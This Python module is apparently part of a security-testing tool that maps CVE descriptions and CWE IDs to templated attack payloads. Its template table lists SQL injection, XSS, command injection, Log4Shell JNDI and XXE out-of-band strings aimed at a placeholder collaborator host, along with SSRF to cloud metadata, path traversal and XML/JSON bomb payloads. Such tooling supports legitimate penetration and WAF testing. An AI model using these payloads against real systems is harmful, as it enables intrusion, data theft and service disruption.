#!/usr/bin/env python3
"""
Fray — Payload Creation from CVE Description (#144)

Generates targeted security payloads from CVE descriptions using:
  1. Pattern matching — map CVE keywords to known payload templates
  2. Parameter extraction — pull affected software, version, vector from CVE text
  3. Payload synthesis — combine templates with CVE-specific parameters
  4. Optional LLM enhancement — use AI to generate novel bypass variants

Supports:
  - NVD JSON format (from fray feed / threat_intel)
  - Raw CVE-ID lookup (fetches from NVD API)
  - Free-text vulnerability descriptions
  - Batch processing from JSONL

CLI:
    fray cve-payload CVE-2024-12345
    fray cve-payload CVE-2024-12345 --test-target https://example.com
    fray cve-payload --description "SQL injection in login form via username param"
    fray cve-payload --file cves.jsonl -o payloads.json
"""

import http.client
import json
import os
import re
import ssl
import time
import urllib.parse
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

try:
    from fray import __version__
except ImportError:
    __version__ = "dev"


# ── CVE → Vulnerability Type Classification ──────────────────────────────────

_CVE_PATTERNS = [
    # (regex on description, vuln_type, base_severity)
    (r"sql\s*inject|sqli|sql\s+command", "sqli", "critical"),
    (r"cross.?site\s*script|xss|script\s*inject", "xss", "high"),
    (r"remote\s*code\s*execut|\brce\b|command\s*inject|os\s*command|jndi\s*inject|log4j|code\s*execut|arbitrary\s*code", "rce", "critical"),
    (r"server.?side\s*request\s*forg|ssrf", "ssrf", "high"),
    (r"server.?side\s*template\s*inject|ssti", "ssti", "critical"),
    (r"path\s*travers|directory\s*travers|\.\.\/|local\s*file\s*inclus|lfi", "lfi", "high"),
    (r"remote\s*file\s*inclus|rfi", "rfi", "high"),
    (r"xml\s*external\s*entit|xxe", "xxe", "high"),
    (r"insecure\s*deseria|deserialization|object\s*inject", "deserialization", "critical"),
    (r"open\s*redirect|url\s*redirect|redirect\s*bypass", "open_redirect", "medium"),
    (r"cross.?site\s*request\s*forg|csrf|xsrf", "csrf", "medium"),
    (r"authentication\s*bypass|auth\s*bypass|login\s*bypass|bypass\w*\s+(?:\w+\s+){0,3}authenticat", "auth_bypass", "critical"),
    (r"privilege\s*escalat|priv\s*esc|unauthorized\s*access|elevation\s*of\s*privilege", "privesc", "high"),
    (r"denial\s*of\s*service|\bdos\b|ddos|resource\s*exhaust|resource\s*consumpt", "dos", "medium"),
    (r"buffer\s*overflow|stack\s*overflow|heap\s*overflow", "overflow", "critical"),
    (r"information\s*disclos|info\s*leak|data\s*expos", "info_disclosure", "medium"),
    (r"idor|insecure\s*direct\s*object|broken\s*access", "idor", "high"),
    (r"prototype\s*pollut", "prototype_pollution", "high"),
    (r"cache\s*poison", "cache_poison", "medium"),
    (r"request\s*smuggl|http\s*smuggl|cl\.te|te\.cl", "smuggling", "high"),
    (r"crlf\s*inject|header\s*inject|response\s*split", "crlf", "medium"),
    (r"ldap\s*inject", "ldap_injection", "high"),
    (r"xpath\s*inject", "xpath_injection", "high"),
    (r"race\s*condition|toctou|time.?of.?check", "race_condition", "medium"),
]

# ── Payload Templates per Vulnerability Type ─────────────────────────────────

_PAYLOAD_TEMPLATES: Dict[str, List[Dict[str, str]]] = {
    "sqli": [
        {"payload": "' OR '1'='1", "context": "authentication bypass", "technique": "tautology"},
        {"payload": "' UNION SELECT NULL,NULL,NULL--", "context": "data extraction", "technique": "union"},
        {"payload": "'; WAITFOR DELAY '0:0:5'--", "context": "blind detection", "technique": "time_based"},
        {"payload": "1' AND (SELECT SLEEP(5))--", "context": "blind MySQL", "technique": "time_based"},
        {"payload": "' OR 1=1 LIMIT 1--", "context": "authentication bypass", "technique": "tautology"},
        {"payload": "admin'--", "context": "login bypass", "technique": "comment_truncation"},
    ],
    "xss": [
        {"payload": "<script>alert(document.domain)</script>", "context": "reflected", "technique": "direct"},
        {"payload": "<img src=x onerror=alert(1)>", "context": "reflected", "technique": "event_handler"},
        {"payload": "\"><svg/onload=alert(1)>", "context": "attribute breakout", "technique": "tag_injection"},
        {"payload": "javascript:alert(1)", "context": "href/src injection", "technique": "protocol"},
        {"payload": "'-alert(1)-'", "context": "template literal", "technique": "js_context"},
        {"payload": "{{constructor.constructor('alert(1)')()}}", "context": "angular/template", "technique": "ssti_xss"},
    ],
    "rce": [
        {"payload": "; id", "context": "command chaining", "technique": "semicolon"},
        {"payload": "| cat /etc/passwd", "context": "pipe injection", "technique": "pipe"},
        {"payload": "$(whoami)", "context": "command substitution", "technique": "subshell"},
        {"payload": "`id`", "context": "backtick execution", "technique": "backtick"},
        {"payload": "127.0.0.1%0aid", "context": "newline injection", "technique": "crlf"},
        {"payload": "{${sleep(5)}}", "context": "expression language", "technique": "el_injection"},
        {"payload": "${jndi:ldap://BURP_COLLAB/a}", "context": "Log4Shell JNDI", "technique": "jndi_lookup"},
        {"payload": "${jndi:dns://BURP_COLLAB}", "context": "Log4Shell DNS OOB", "technique": "jndi_dns"},
        {"payload": "${${lower:j}${lower:n}${lower:d}i:ldap://BURP_COLLAB/a}", "context": "Log4Shell bypass", "technique": "jndi_obfuscated"},
    ],
    "ssrf": [
        {"payload": "http://127.0.0.1", "context": "localhost access", "technique": "direct"},
        {"payload": "http://169.254.169.254/latest/meta-data/", "context": "AWS metadata", "technique": "cloud_metadata"},
        {"payload": "http://[::1]", "context": "IPv6 localhost", "technique": "ipv6"},
        {"payload": "http://0x7f000001", "context": "hex IP bypass", "technique": "encoding"},
        {"payload": "gopher://127.0.0.1:6379/_INFO", "context": "Redis via gopher", "technique": "protocol_smuggling"},
    ],
    "ssti": [
        {"payload": "{{7*7}}", "context": "Jinja2/Twig detection", "technique": "arithmetic"},
        {"payload": "${7*7}", "context": "Freemarker/EL detection", "technique": "arithmetic"},
        {"payload": "{{''.__class__.__mro__[1].__subclasses__()}}", "context": "Jinja2 RCE", "technique": "class_traversal"},
        {"payload": "<%= 7*7 %>", "context": "ERB/EJS detection", "technique": "arithmetic"},
        {"payload": "#{7*7}", "context": "Ruby/Slim detection", "technique": "arithmetic"},
    ],
    "lfi": [
        {"payload": "../../../../etc/passwd", "context": "Unix LFI", "technique": "traversal"},
        {"payload": "....//....//....//etc/passwd", "context": "filter bypass", "technique": "double_dot"},
        {"payload": "/etc/passwd%00.jpg", "context": "null byte", "technique": "null_byte"},
        {"payload": "php://filter/convert.base64-encode/resource=index.php", "context": "PHP wrapper", "technique": "php_filter"},
        {"payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "context": "Windows LFI", "technique": "backslash"},
    ],
    "xxe": [
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
         "context": "file read", "technique": "entity_expansion"},
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://BURP_COLLAB">]><foo>&xxe;</foo>',
         "context": "OOB exfiltration", "technique": "oob_http"},
    ],
    "deserialization": [
        {"payload": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==", "context": "Java deserialization", "technique": "gadget_chain"},
        {"payload": 'O:8:"stdClass":0:{}', "context": "PHP object injection", "technique": "php_unserialize"},
        {"payload": '{"__class__": "subprocess.Popen", "__args__": ["id"]}', "context": "Python pickle-like", "technique": "python_deser"},
    ],
    "open_redirect": [
        {"payload": "//evil.com", "context": "protocol-relative", "technique": "double_slash"},
        {"payload": "/\\evil.com", "context": "backslash bypass", "technique": "backslash"},
        {"payload": "https://evil.com@legitimate.com", "context": "@ bypass", "technique": "at_sign"},
    ],
    "auth_bypass": [
        {"payload": '{"role": "admin"}', "context": "role tampering", "technique": "mass_assignment"},
        {"payload": "X-Forwarded-For: 127.0.0.1", "context": "IP whitelist bypass", "technique": "header_spoof"},
        {"payload": '{"alg": "none"}', "context": "JWT none algorithm", "technique": "jwt_none"},
    ],
    "idor": [
        {"payload": "/api/users/1", "context": "sequential ID", "technique": "id_enumeration"},
        {"payload": "/api/users/VICTIM_UUID", "context": "UUID guessing", "technique": "uuid_enum"},
    ],
    "prototype_pollution": [
        {"payload": '{"__proto__": {"admin": true}}', "context": "proto override", "technique": "proto_key"},
        {"payload": '{"constructor": {"prototype": {"isAdmin": true}}}', "context": "constructor chain", "technique": "constructor"},
    ],
    "crlf": [
        {"payload": "%0d%0aSet-Cookie:hacked=1", "context": "header injection", "technique": "crlf_header"},
        {"payload": "%0d%0a%0d%0a<script>alert(1)</script>", "context": "response splitting", "technique": "response_split"},
    ],
    "cache_poison": [
        {"payload": "X-Forwarded-Host: evil.com", "context": "host override", "technique": "unkeyed_header"},
        {"payload": "X-Original-URL: /admin", "context": "path override", "technique": "path_override"},
    ],
    "smuggling": [
        {"payload": "Transfer-Encoding: chunked\\r\\nTransfer-Encoding: x", "context": "TE.TE", "technique": "te_te"},
        {"payload": "Content-Length: 0\\r\\nTransfer-Encoding: chunked", "context": "CL.TE", "technique": "cl_te"},
    ],
    "dos": [
        {"payload": "GET / HTTP/1.1\r\nHost: TARGET\r\n" * 50, "context": "request flood", "technique": "repeated_request"},
        {"payload": '{"query":"{' + 'a(b:{' * 30 + '}}' * 30 + '}"}', "context": "nested JSON DoS", "technique": "json_bomb"},
        {"payload": "<xml>" + "<a>" * 100000 + "</a>" * 100000 + "</xml>", "context": "XML bomb", "technique": "billion_laughs"},
        {"payload": "A" * 100000, "context": "large payload", "technique": "buffer_overflow"},
    ],
    "privesc": [
        {"payload": '{"role": "admin"}', "context": "role escalation", "technique": "mass_assignment"},
        {"payload": '{"is_admin": true, "user_type": "superuser"}', "context": "privilege field tampering", "technique": "field_injection"},
        {"payload": 'X-Forwarded-For: 127.0.0.1', "context": "IP-based privilege", "technique": "header_spoof"},
        {"payload": '{"user_id": 1}', "context": "admin ID substitution", "technique": "idor_privesc"},
        {"payload": '../../../admin', "context": "path traversal to admin", "technique": "path_traversal"},
    ],
}

# ── CWE → Vulnerability Type Mapping ─────────────────────────────────────────

_CWE_MAP = {
    "CWE-79": "xss", "CWE-89": "sqli", "CWE-78": "rce", "CWE-77": "rce",
    "CWE-94": "rce", "CWE-918": "ssrf", "CWE-22": "lfi", "CWE-611": "xxe",
    "CWE-502": "deserialization", "CWE-601": "open_redirect", "CWE-352": "csrf",
    "CWE-287": "auth_bypass", "CWE-269": "privesc", "CWE-400": "dos",
    "CWE-120": "overflow", "CWE-200": "info_disclosure", "CWE-639": "idor",
    "CWE-1321": "prototype_pollution", "CWE-113": "crlf", "CWE-90": "ldap_injection",
    "CWE-643": "xpath_injection", "CWE-362": "race_condition",
    "CWE-284": "auth_bypass", "CWE-306": "auth_bypass", "CWE-862": "idor",
    "CWE-863": "privesc", "CWE-98": "rfi", "CWE-434": "rce",
    "CWE-476": "dos", "CWE-787": "overflow", "CWE-416": "overflow",
    "CWE-190": "overflow", "CWE-776": "dos", "CWE-444": "smuggling",
}

# Default payloads for unmapped types
_DEFAULT_PAYLOADS = [
    {"payload": "{{7*7}}", "context": "template injection probe", "technique": "arithmetic"},
    {"payload": "' OR '1'='1", "context": "injection probe", "technique": "tautology"},
    {"payload": "<script>alert(1)</script>", "context": "XSS probe", "technique": "direct"},
]


# ── CVE Data Fetching ────────────────────────────────────────────────────────

def _fetch_cve_nvd(cve_id: str, timeout: int = 10) -> Optional[Dict[str, Any]]:
    """Fetch CVE data from NVD API 2.0."""
    try:
        conn = http.client.HTTPSConnection("services.nvd.nist.gov", timeout=timeout)
        path = f"/rest/json/cves/2.0?cveId={urllib.parse.quote(cve_id)}"
        conn.request("GET", path, headers={
            "User-Agent": f"Fray/{__version__}",
            "Accept": "application/json",
        })
        resp = conn.getresponse()
        if resp.status != 200:
            return None
        body = resp.read(256 * 1024).decode("utf-8", "replace")
        conn.close()
        data = json.loads(body)
        vulns = data.get("vulnerabilities", [])
        if vulns:
            return vulns[0].get("cve", {})
        return None
    except Exception:
        return None


def _extract_cve_info(cve_data: Dict[str, Any]) -> Dict[str, Any]:
    """Extract key info from NVD CVE JSON."""
    cve_id = cve_data.get("id", "")
    descriptions = cve_data.get("descriptions", [])
    desc = ""
    for d in descriptions:
        if d.get("lang") == "en":
            desc = d.get("value", "")
            break
    if not desc and descriptions:
        desc = descriptions[0].get("value", "")

    # CVSS score
    metrics = cve_data.get("metrics", {})
    cvss_score = 0.0
    cvss_severity = ""
    for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
        m = metrics.get(key, [])
        if m:
            cvss_data = m[0].get("cvssData", {})
            cvss_score = cvss_data.get("baseScore", 0.0)
            cvss_severity = cvss_data.get("baseSeverity", "")
            break

    # CWE IDs
    cwe_ids = []
    for weakness in cve_data.get("weaknesses", []):
        for wd in weakness.get("description", []):
            val = wd.get("value", "")
            if val.startswith("CWE-"):
                cwe_ids.append(val)

    # Affected software (CPE)
    configs = cve_data.get("configurations", [])
    affected = []
    for cfg in configs:
        for node in cfg.get("nodes", []):
            for match in node.get("cpeMatch", []):
                cpe = match.get("criteria", "")
                if cpe:
                    parts = cpe.split(":")
                    if len(parts) > 4:
                        affected.append({
                            "vendor": parts[3],
                            "product": parts[4],
                            "version": parts[5] if len(parts) > 5 else "*",
                        })

    # References
    refs = [r.get("url", "") for r in cve_data.get("references", [])]

    return {
        "cve_id": cve_id,
        "description": desc,
        "cvss_score": cvss_score,
        "cvss_severity": cvss_severity,
        "cwe_ids": cwe_ids,
        "affected_software": affected[:10],
        "references": refs[:10],
    }


# ── Classification + Payload Generation ──────────────────────────────────────

def _classify_vuln(description: str) -> List[Tuple[str, str]]:
    """Classify vulnerability type(s) from description text.

    Returns list of (vuln_type, severity) tuples.
    """
    desc_lower = description.lower()
    matches = []
    for pattern, vuln_type, severity in _CVE_PATTERNS:
        if re.search(pattern, desc_lower):
            matches.append((vuln_type, severity))
    if not matches:
        matches.append(("unknown", "medium"))
    return matches


def _extract_parameters(description: str) -> Dict[str, str]:
    """Extract attack-relevant parameters from CVE description."""
    params: Dict[str, str] = {}

    # Extract parameter names — match both "username parameter" and "parameter username"
    param_matches = re.findall(
        r'(?:the\s+)?(\w+)\s+(?:parameter|param|field|input|argument)',
        description, re.IGNORECASE)
    if not param_matches:
        param_matches = re.findall(
            r'(?:parameter|param|field|input|argument)\s+["\']?(\w+)["\']?',
            description, re.IGNORECASE)
    # Filter out noise words
    _NOISE = {"the", "a", "an", "this", "that", "each", "every", "any", "some", "of", "in", "via"}
    param_matches = [p for p in param_matches if p.lower() not in _NOISE]
    if param_matches:
        params["parameter"] = param_matches[0]

    # Extract endpoint paths — strip URLs first, then find bare paths
    desc_no_urls = re.sub(r'https?://\S+', '', description)
    path_matches = re.findall(r'(/[\w/.-]+)', desc_no_urls)
    # Filter out version strings, short noise paths, and common English fragments
    _PATH_NOISE = {"/or", "/to", "/a", "/an", "/the", "/in", "/on", "/of", "/is", "/it",
                   "/as", "/at", "/by", "/be", "/if", "/no", "/do", "/up", "/so"}
    path_matches = [p for p in path_matches if
                    not p.startswith('//') and
                    not re.match(r'^/\d+\.\d+', p) and
                    len(p) > 3 and
                    p.lower() not in _PATH_NOISE]
    if path_matches:
        params["path"] = path_matches[0]

    # Extract affected component
    comp_matches = re.findall(
        r'(?:in|of|via|through)\s+(?:the\s+)?(\w+(?:\s+\w+)?)\s+(?:component|module|function|endpoint|page|feature)',
        description, re.IGNORECASE)
    if comp_matches:
        params["component"] = comp_matches[0]

    return params


def generate_payloads_from_cve(
    cve_id: str = "",
    description: str = "",
    cve_data: Optional[Dict[str, Any]] = None,
    max_payloads: int = 10,
    timeout: int = 10,
) -> Dict[str, Any]:
    """Generate targeted payloads from a CVE ID or description.

    Args:
        cve_id: CVE identifier (e.g., CVE-2024-12345). Fetches from NVD.
        description: Free-text vulnerability description (alternative to cve_id).
        cve_data: Pre-fetched NVD CVE data dict (skip API call).
        max_payloads: Maximum number of payloads to generate.
        timeout: API request timeout.

    Returns:
        Dict with cve_info, vuln_types, payloads, and metadata.
    """
    result: Dict[str, Any] = {
        "cve_id": cve_id,
        "description": description,
        "vuln_types": [],
        "payloads": [],
        "affected_software": [],
        "cvss_score": 0.0,
        "parameters": {},
        "error": "",
    }

    # Step 1: Get CVE data
    if cve_id and not cve_data:
        cve_data = _fetch_cve_nvd(cve_id, timeout)
        if not cve_data:
            result["error"] = f"Could not fetch CVE data for {cve_id}"
            # Fall through — if description is provided we can still work

    cwe_ids: List[str] = []
    if cve_data:
        info = _extract_cve_info(cve_data)
        result["cve_id"] = info["cve_id"]
        result["description"] = info["description"]
        result["cvss_score"] = info["cvss_score"]
        result["affected_software"] = info["affected_software"]
        cwe_ids = info.get("cwe_ids", [])
        result["cwe_ids"] = cwe_ids
        description = info["description"]

    if not description:
        result["error"] = "No CVE data or description provided"
        return result

    # Step 2: Classify vulnerability type (description-based)
    vuln_matches = _classify_vuln(description)

    # Step 2b: If only "unknown" matched, try CWE-based classification
    if len(vuln_matches) == 1 and vuln_matches[0][0] == "unknown" and cwe_ids:
        cwe_matches = []
        for cwe_id in cwe_ids:
            if cwe_id in _CWE_MAP:
                vtype = _CWE_MAP[cwe_id]
                # Infer severity from CVSS if available
                score = result.get("cvss_score", 0.0)
                if score >= 9.0:
                    sev = "critical"
                elif score >= 7.0:
                    sev = "high"
                elif score >= 4.0:
                    sev = "medium"
                else:
                    sev = "low"
                cwe_matches.append((vtype, sev))
        if cwe_matches:
            vuln_matches = cwe_matches

    result["vuln_types"] = [{"type": vt, "severity": sev} for vt, sev in vuln_matches]

    # Step 3: Extract parameters
    params = _extract_parameters(description)
    result["parameters"] = params

    # Step 4: Generate payloads
    payloads = []
    seen = set()
    for vuln_type, severity in vuln_matches:
        templates = _PAYLOAD_TEMPLATES.get(vuln_type, _DEFAULT_PAYLOADS)
        for tmpl in templates:
            p = tmpl["payload"]
            if p in seen:
                continue
            seen.add(p)
            entry = {
                "payload": p,
                "vuln_type": vuln_type,
                "severity": severity,
                "context": tmpl.get("context", ""),
                "technique": tmpl.get("technique", ""),
            }
            # Customize with extracted parameters
            if params.get("parameter"):
                entry["target_parameter"] = params["parameter"]
            if params.get("path"):
                entry["target_path"] = params["path"]
            payloads.append(entry)
            if len(payloads) >= max_payloads:
                break
        if len(payloads) >= max_payloads:
            break

    # If no specific payloads matched, add defaults
    if not payloads:
        for tmpl in _DEFAULT_PAYLOADS[:max_payloads]:
            payloads.append({
                "payload": tmpl["payload"],
                "vuln_type": "unknown",
                "severity": "medium",
                "context": tmpl["context"],
                "technique": tmpl["technique"],
            })

    result["payloads"] = payloads
    return result


def generate_payloads_batch(
    source: str,
    max_payloads: int = 5,
    output: str = "",
    timeout: int = 10,
) -> List[Dict[str, Any]]:
    """Generate payloads from a JSONL file of CVEs.

    Each line should have either 'cve_id' or 'description'.

    Returns list of results.
    """
    results = []
    with open(source, "r") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                entry = json.loads(line)
            except json.JSONDecodeError:
                # Treat as plain CVE ID
                entry = {"cve_id": line}

            cve_id = entry.get("cve_id", entry.get("id", ""))
            desc = entry.get("description", "")
            r = generate_payloads_from_cve(
                cve_id=cve_id, description=desc,
                max_payloads=max_payloads, timeout=timeout,
            )
            results.append(r)
            time.sleep(0.5)  # Rate limit NVD API

    if output:
        Path(output).parent.mkdir(parents=True, exist_ok=True)
        with open(output, "w") as f:
            for r in results:
                f.write(json.dumps(r, ensure_ascii=False) + "\n")

    return results


# ── CLI-friendly output ──────────────────────────────────────────────────────

def print_cve_payloads(result: Dict[str, Any]):
    """Pretty-print CVE payload generation results."""
    B = "\033[1m"
    D = "\033[2m"
    R = "\033[0m"
    RED = "\033[91m"
    YEL = "\033[93m"
    GRN = "\033[92m"
    CYN = "\033[96m"

    print(f"\n{D}{'━' * 60}{R}")
    print(f"  {B}CVE → Payload Generator{R}")
    if result.get("cve_id"):
        print(f"  {CYN}{result['cve_id']}{R}", end="")
        if result.get("cvss_score"):
            score = result["cvss_score"]
            color = RED if score >= 7.0 else YEL if score >= 4.0 else GRN
            print(f"  {color}CVSS {score}{R}")
        else:
            print()
    print(f"{D}{'━' * 60}{R}")

    # Description
    desc = result.get("description", "")
    if desc:
        # Wrap at 56 chars
        words = desc.split()
        lines = []
        line = "  "
        for w in words:
            if len(line) + len(w) > 58:
                lines.append(line)
                line = "  "
            line += w + " "
        if line.strip():
            lines.append(line)
        for l in lines[:4]:
            print(f"  {D}{l.strip()}{R}")
        if len(lines) > 4:
            print(f"  {D}...{R}")

    # Vuln types
    vtypes = result.get("vuln_types", [])
    if vtypes:
        types_str = ", ".join(f"{v['type']}({v['severity']})" for v in vtypes)
        print(f"\n  {B}Classification:{R} {types_str}")

    # Affected software
    affected = result.get("affected_software", [])
    if affected:
        sw = ", ".join(f"{a['vendor']}/{a['product']}" for a in affected[:3])
        print(f"  {B}Affected:{R} {sw}")

    # Parameters
    params = result.get("parameters", {})
    if params:
        print(f"  {B}Extracted:{R} {', '.join(f'{k}={v}' for k, v in params.items())}")

    # Payloads
    payloads = result.get("payloads", [])
    if payloads:
        print(f"\n  {B}Payloads ({len(payloads)}){R}")
        for i, p in enumerate(payloads, 1):
            sev = p.get("severity", "medium")
            color = RED if sev in ("critical",) else YEL if sev == "high" else GRN
            technique = p.get("technique", "")
            context = p.get("context", "")
            print(f"    {color}{i:2d}.{R} {p['payload'][:60]}")
            if technique or context:
                print(f"        {D}{p['vuln_type']} | {technique} | {context}{R}")

    # Error
    if result.get("error"):
        print(f"\n  {YEL}Note: {result['error']}{R}")

    print(f"\n{D}{'━' * 60}{R}\n")
